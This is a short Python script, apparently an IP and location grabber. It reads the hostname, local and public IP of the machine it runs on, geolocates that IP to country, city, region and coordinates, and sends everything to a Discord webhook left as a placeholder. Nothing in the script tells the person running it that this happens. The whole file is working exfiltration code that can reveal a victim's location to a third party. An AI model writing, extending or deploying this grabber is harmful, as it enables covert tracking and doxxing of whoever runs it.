import socket
from requests import get
from discord_webhook import DiscordWebhook
from ip3country import CountryLookup
from ip2geotools.databases.noncommercial import DbIpCity
import ipapi
import geoip2.database
import requests
import pycountry
import subprocess
import time
import re
WB_Url = "discord webhook link"
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
public_ip = get('http://api.ipify.org').text
response = DbIpCity.get(public_ip, api_key='free')
clookup = CountryLookup()
cc = clookup.lookupStr(public_ip)
def get_country_name(code):
    try:
        country = pycountry.countries.get(alpha_2=code)
        return country.name
    except AttributeError:
        return "Unknown"
cn = get_country_name(cc)
txxt = f'Host: {hostname}'
txtt = f'Local IP: {local_ip}'
ttxt = f'Public IP: {public_ip}'
tttt = f'Country-code: {clookup.lookupStr(public_ip)}'
xttt = f'Country: {cn}'
xxtt = f'City: {response.city}'
xxxt = f'Region: {response.region}'
xxxx = f'Latitude: {response.latitude}'
txxx = f'Longitude: {response.longitude}'
webhook = DiscordWebhook(url=WB_Url, content=f"{txxt} \n{txtt} \n{ttxt} \n{tttt} \n{xttt} \n{xxtt} \n{xxxt} \n{xxxx} \n{txxx}")
response = webhook.execute()
